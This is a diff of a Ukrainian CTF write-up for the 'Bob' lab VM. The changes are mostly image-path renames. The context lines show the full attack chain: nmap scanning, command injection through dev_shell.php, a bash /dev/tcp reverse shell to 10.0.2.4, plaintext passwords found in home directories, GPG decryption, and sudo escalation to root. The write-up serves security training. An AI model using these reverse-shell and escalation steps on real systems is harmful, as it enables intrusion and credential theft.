@@ -29,7 +29,7 @@
 ```sh
 sudo netdiscover -r 10.0.2.0/24
 ```
-![Результат](./Bob/image-1.png)
+![Результат](./bob/image-1.png)
 
 ***** Питання: яка з команд будк працювати швидче?
 sudo netdiscover -r 10.0.2.0/24
@@ -52,7 +52,7 @@ sudo nmap -sV --reason 10.0.2.13
 
 Отримуємо наступне:
 
-![приклад використання nmap](./Bob/image.png)
+![приклад використання nmap](./bob/image.png)
 
 Як бачимо, в нас є умовний доступ лише до вебверверу, то можна спробувати розширене сканування за допомогою **nmap**
 ```sh
@@ -120,7 +120,7 @@ nmap → сканує тільки 1000 найпопулярніших порт�
 - логування;
 - додавання до CTF write-up.
 
-![nmap_extended](./Bob/image-2.png)
+![nmap_extended](./bob/image-2.png)
 
 Таким чином знайшли ssh-сервіс, якому змінили порт (один із способів захисту)
 
@@ -128,24 +128,24 @@ nmap → сканує тільки 1000 найпопулярніших порт�
 ### 3. Дослідження вебсервера
 
 У браузері відкриваємо http://10.0.2.13,  отримуємо:
-![main_page](./Bob/image-3.png)
+![main_page](./bob/image-3.png)
 
 
 Передивимось **robots.txt**:
-![robots.txt](./Bob/image-4.png)
+![robots.txt](./bob/image-4.png)
 
 Після перегляду всіх сторінок, що ми знайшли, подальшу увагу приділимо
 **http://10.0.2.13/dev_shell.php**
 та спробуємо ввести команди bash, наприклад: **w, id, pwd** тощо.
 Бачимо, що деякі команди відпрацьовують коректно, та можемо встановити користувача від якого виконуються ці команди.
 
-![dev_shell.php_id](./Bob/image-5.png)
+![dev_shell.php_id](./bob/image-5.png)
 
 Такий результат дає можливість спробувати отримати реверс-шел, то почнемо:
 ```sh
 nc -lvnp 3421
 ```
-![nc -lvnp 3421](./Bob/image-6.png)
+![nc -lvnp 3421](./bob/image-6.png)
 
 Для створення реверсшелу на боці цілі можемо скористатись 
 [ресурсом  GutHub:](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp)
@@ -156,10 +156,10 @@ nc -lvnp 3421
 bash -c 'bash -i >& /dev/tcp/10.0.2.4/3421 0>&1'
 ```
 вводимо цей рядок у форму **http://10.0.2.13/dev_shell.php**
-![dev_shell_reverse](./Bob/image-7.png)
+![dev_shell_reverse](./bob/image-7.png)
 
 Та отримуємо наступний результат:
-![reverse_shell](./Bob/image-8.png)
+![reverse_shell](./bob/image-8.png)
 
 Робимо перевірку повноважень sudo:
 
@@ -167,10 +167,10 @@ bash -c 'bash -i >& /dev/tcp/10.0.2.4/3421 0>&1'
 sudo -l
 ```
 Отримуємо результат:
-![sudo -l](./Bob/image-9.png)
+![sudo -l](./bob/image-9.png)
 
 Спробуємо перевірити домашні каталогі:
-![ls /home](./Bob/image-10.png)
+![ls /home](./bob/image-10.png)
 
 Почнемо певно з директорії **/home/bob**
 Для виводу прихованих файлів скористаємось командою:
@@ -178,19 +178,19 @@ sudo -l
 ls -la
 ``` 
 Отримуємо результат:
-![.old_passwordfile.html](./Bob/image-11.png)
+![.old_passwordfile.html](./bob/image-11.png)
 
 Маємо наступні креди:
-![creds](./Bob/image-12.png)
+![creds](./bob/image-12.png)
 **jc:Qwerty**
 **seb:T1tanium_Pa$$word_Hack3rs_Fear_M3**
 
 Перевіряємо інші домані каталогі:
 Маємо цікавий файл.
-![theadminisdumb.txt](./Bob/image-13.png)
+![theadminisdumb.txt](./bob/image-13.png)
 
 Визначаємо зміст:
-![theadminisdumb](./Bob/image-14.png)
+![theadminisdumb](./bob/image-14.png)
 
 **elliot:theadminisdumb**
 
@@ -198,49 +198,47 @@ ls -la
 
 
 То починаємо більш детально досліджувати директорію **/home/bob**
-![cat staff.txt](./Bob/image-16.png)
+![cat staff.txt](./bob/image-16.png)
 **cat staff.txt** - це скоріше про інтригі в команді
-![cat login.txt.gpg](./Bob/image-17.png) 
+![cat login.txt.gpg](./bob/image-17.png) 
 Розширення “.gpg” вказує на те, що файл зашифрований за допомогою GPG (GNU Privacy Guard) або GnuPG. GPG — це безкоштовне програмне забезпечення з відкритим кодом, яке забезпечує криптографічну конфіденційність та автентифікацію під час обміну даними.
 Спроба відкрити цей файл вимагає ключ дешифрування, якого у нас немає.
 Тобто загальний вигляд викрристання наступний:
 ```sh
 gpg --batch --yes --passphrase 'PASSWORD_PHRASE' -o login.txt -d login.txt.gpg
 ```
-![notes.sh](./Bob/image-15.png) - а це те, чим можна скористатись.
+![notes.sh](./bob/image-15.png) - а це те, чим можна скористатись.
 
 Для  перевірки, що це не випадкова послідовність, перевіримо гуглом:
-![Harpocrates](./Bob/image-18.png)
+![Harpocrates](./bob/image-18.png)
 
 Під користувачем **www-data** немає можливості запустити **gpg**, то користуємось 
 знайденими кредами:
-![gpg2work](./Bob/image-19.png)
+![gpg2work](./bob/image-19.png)
 Спробуємо розшифрувати **login.txt.gpg**
 ```sh
 gpg --batch --yes --passphrase 'HARPOCRATES' -d login.txt.gpg
 ```
 Розшифрований файл має вигляд:
-![bob:b0bcat_](./Bob/image-20.png)
+![bob:b0bcat_](./bob/image-20.png)
 
 Наступним кроком спробуємо залогінуватись під користувачем **bob**.
 Маємо позитивний результат.
 
-![su bob](./Bob/image-21.png)
+![su bob](./bob/image-21.png)
 
 Перевіремо наші дозволи за допомогою **sudo -l**.
 Результат - користувач bob має root привілеї.
 
-![sudo -l](./Bob/image-22.png)
+![sudo -l](./bob/image-22.png)
 
 Переходимо в рута за допомогою команди ***sudo -i*
 Результат - стали рутом.
 
-![sudo -i](./Bob/image-23.png)
+![sudo -i](./bob/image-23.png)
 
 Знаходимо flag.txt та виводимо його зміст.
 
-![cat flag.txt](./Bob/image-24.png)
 
-
-Вітання, CTF VM Bob пройдена!
+Вітання, CTF VM bob пройдена!
 
